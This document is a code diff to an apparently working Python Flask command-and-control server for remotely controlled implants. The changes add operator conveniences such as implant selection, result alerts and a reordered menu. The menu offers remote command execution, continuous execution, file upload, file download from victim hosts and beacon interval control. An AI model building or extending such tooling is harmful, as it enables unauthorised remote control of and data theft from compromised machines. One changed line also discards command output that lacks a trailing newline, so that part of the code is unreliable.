@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# Purpose: Beacon C2 Server. Queues tasks for implants that call home on an interval. 
+# Purpose: Beacon C2 Server. Queues tasks for implants that call home on an interval.
 #          The operator interacts via an interactive CLI; implants poll for work.
 # Author: Israel Fernandez
 # Date of creation: April 8, 2026
@@ -22,6 +22,10 @@ from datetime import datetime, timezone
 from flask import Flask, jsonify, request
 
 app = Flask(__name__)
+
+# Silence Flask HTTP log lines (still prints errors).
+import logging as _logging
+_logging.getLogger("werkzeug").setLevel(_logging.ERROR)
 
 # Each implant registers with a UUID. Tasks and results are keyed by that ID.
 implants = {}                              # {id: {info dict}}
@@ -78,6 +82,9 @@ def success(msg):
 def log(msg):
     print(f"{bcolors.BOLD}[#]{bcolors.ENDC} {msg}")
 
+def notify(msg):
+    print(f"\n{bcolors.BOLD}{bcolors.OKCYAN}[>>]{bcolors.ENDC} {msg}")
+
 # Increment task ID
 def _next_task_id():
     global task_counter
@@ -97,7 +104,7 @@ def register():
         "registered": datetime.now(timezone.utc).isoformat(),
         "last_seen": datetime.now(timezone.utc).isoformat(),
     }
-    success(f"New implant registered: {implant_id} ({implants[implant_id]['user']}@{implants[implant_id]['hostname']})")
+    notify(f"New implant registered: {implant_id} ({implants[implant_id]['user']}@{implants[implant_id]['hostname']})")
     return jsonify({"ok": True, "id": implant_id})
 
 
@@ -126,6 +133,11 @@ def post_results(implant_id):
     return jsonify({"ok": True})
 
 
+# Tracks the last-seen result count per implant for change detection
+_seen_result_counts = defaultdict(int)
+# Holds the currently selected implant UUID so you don't re-pick every command
+_selected_implant = None
+
 
 def print_splash():
     bar = "-" * (len(SPLASH) + len(SPLASH) // 2)
@@ -140,23 +152,46 @@ def list_implants():
     if not implants:
         warn("No implants registered yet.")
         return
-    print(f"\n{'ID':>4}  {'Implant UUID':<38} {'User@Host':<30} {'Last Seen'}")
+
+    print(f"\n{'#':>3}  {'UUID':<38} {'User@Host':<30} {'Results':>7}  Last Seen")
     print("-" * 100)
     for i, (iid, info) in enumerate(implants.items(), 1):
-        print(f"{i:>4}  {iid:<38} {info['user']}@{info['hostname']:<25} {info['last_seen']}")
+        if iid == _selected_implant:
+            marker = f"{bcolors.BOLD}*{bcolors.ENDC}"
+        else:
+            marker = " "
+
+        pending = len(result_store.get(iid, []))
+        if pending:
+            pending_str = f"{bcolors.OKGREEN}{pending:>7}{bcolors.ENDC}" 
+        else:
+            pending_str = f"{'0':>7}"
+
+        print(f"{marker}{i:>2}  {iid:<38} {info['user']}@{info['hostname']:<25} {pending_str}  {info['last_seen']}")
     print()
 
 
 def pick_implant():
-    list_implants()
+    global _selected_implant
     if not implants:
+        warn("No implants registered yet.")
         return None
+
     ids = list(implants.keys())
+    # Auto-select if there's only one
     if len(ids) == 1:
-        return ids[0]
+        _selected_implant = ids[0]
+
+    # If we already have a valid selection, use it
+    if _selected_implant and _selected_implant in implants:
+        return _selected_implant
+
+    # Otherwise prompt
+    list_implants()
     try:
         idx = int(input("Select implant #: ")) - 1
-        return ids[idx]
+        _selected_implant = ids[idx]
+        return _selected_implant
     except (ValueError, IndexError):
         err("Invalid selection.")
         return None
@@ -175,10 +210,15 @@ def show_results(implant_id):
     if not results:
         warn("No results yet for this implant.")
         return
+
     for r in results:
         task_id = r.get("task_id", "?")
         task_type = r.get("type", "?")
-        print(f"\n--- Task #{task_id} ({task_type}) @ {r.get('received_at', '?')} ---")
+        if task_type == "execute" and r.get("command"):
+            cmd_info = f"  `{r['command']}`"
+        else:
+            cmd_info = ""
+        print(f"\n{bcolors.BOLD}--- Task #{task_id} ({task_type}){cmd_info} @ {r.get('received_at', '?')} ---{bcolors.ENDC}")
         if r.get("ok"):
             if r.get("data"):
                 # Download result. Decode and save to disk
@@ -189,32 +229,65 @@ def show_results(implant_id):
                     with open(filename, "wb") as f:
                         f.write(file_bytes)
                     success(f"Saved {filename} ({len(file_bytes)} bytes)")
-                except (OSError) as e:
+                except OSError as e:
                     err(f"Failed to save download: {e}")
             elif r.get("output"):
-                print(r["output"])
+                if r["output"].endswith("\n"):
+                    print(r["output"], end="")
+                else:
+                    print("\n")
             else:
                 success("OK")
         else:
             err(f"Error: {r.get('error', 'unknown')}")
     print()
     result_store[implant_id].clear()
+    _seen_result_counts[implant_id] = 0
+
+# Background thread
+# Alerts the operator whenever new results arrive.
+def _result_notifier():
+    while True:
+        time.sleep(2)
+        for iid, results in result_store.items():
+            current = len(results)
+            if current > _seen_result_counts[iid]:
+                new = current - _seen_result_counts[iid]
+                info = implants.get(iid, {})
+                tag = f"{info.get('user','?')}@{info.get('hostname','?')}"
+                notify(f"{new} new result(s) from {bcolors.BOLD}{tag}{bcolors.ENDC}. Choose 6 to view")
+                _seen_result_counts[iid] = current
+
+
+def _menu(selected_tag):
+    if selected_tag:
+        print(f"Implant: {bcolors.BOLD}{selected_tag}{bcolors.ENDC}")
+    else:
+        print("Implant: (none selected)")
+    print("1. List implants       2. Select implant")
+    print("3. Execute command     4. Execute continuously")
+    print("5. Upload file         6. View results")
+    print("7. Download file       8. Set beacon interval")
 
 
 def operator_loop():
+    global _selected_implant
     time.sleep(1)  # let Flask print its startup banner first
     print_splash()
 
+    notifier = threading.Thread(target=_result_notifier, daemon=True)
+    notifier.start()
+
     while True:
         try:
-            print("1. List implants")
-            print("2. Execute command")
-            print("3. Execute continuously")
-            print("4. Upload file (C2 -> Implant)")
-            print("5. Download file (Implant -> C2)")
-            print("6. View results")
-            print("7. Set beacon interval")
+            # Build the selected implant tag for the menu header
+            if _selected_implant and _selected_implant in implants:
+                info = implants[_selected_implant]
+                tag = f"{info['user']}@{info['hostname']}"
+            else:
+                tag = None
 
+            _menu(tag)
             choice = input("\nCommand> ").strip()
             if not choice:
                 continue
@@ -223,12 +296,24 @@ def operator_loop():
                 list_implants()
 
             elif choice == "2":
+                list_implants()
+                ids = list(implants.keys())
+                if ids:
+                    try:
+                        idx = int(input("Select implant #: ")) - 1
+                        _selected_implant = ids[idx]
+                        info = implants[_selected_implant]
+                        success(f"Selected: {info['user']}@{info['hostname']}")
+                    except (ValueError, IndexError):
+                        err("Invalid selection.")
+
+            elif choice == "3":
                 iid = pick_implant()
                 if iid:
                     cmd = input("Command to execute: ")
                     queue_task(iid, "execute", {"command": cmd})
 
-            elif choice == "3":
+            elif choice == "4":
                 iid = pick_implant()
                 if iid:
                     print("Enter commands (type 'quit' to stop):")
@@ -238,7 +323,7 @@ def operator_loop():
                             break
                         queue_task(iid, "execute", {"command": cmd})
 
-            elif choice == "4":
+            elif choice == "5":
                 iid = pick_implant()
                 if iid:
                     local_path = input("Local file to upload: ")
@@ -252,18 +337,18 @@ def operator_loop():
                     except OSError as e:
                         err(f"Failed to read {local_path}: {e}")
 
-            elif choice == "5":
-                iid = pick_implant()
-                if iid:
-                    remote_path = input("Remote file path to download: ")
-                    queue_task(iid, "download", {"filepath": remote_path})
-
             elif choice == "6":
                 iid = pick_implant()
                 if iid:
                     show_results(iid)
 
             elif choice == "7":
+                iid = pick_implant()
+                if iid:
+                    remote_path = input("Remote file path to download: ")
+                    queue_task(iid, "download", {"filepath": remote_path})
+
+            elif choice == "8":
                 iid = pick_implant()
                 if iid:
                     try:
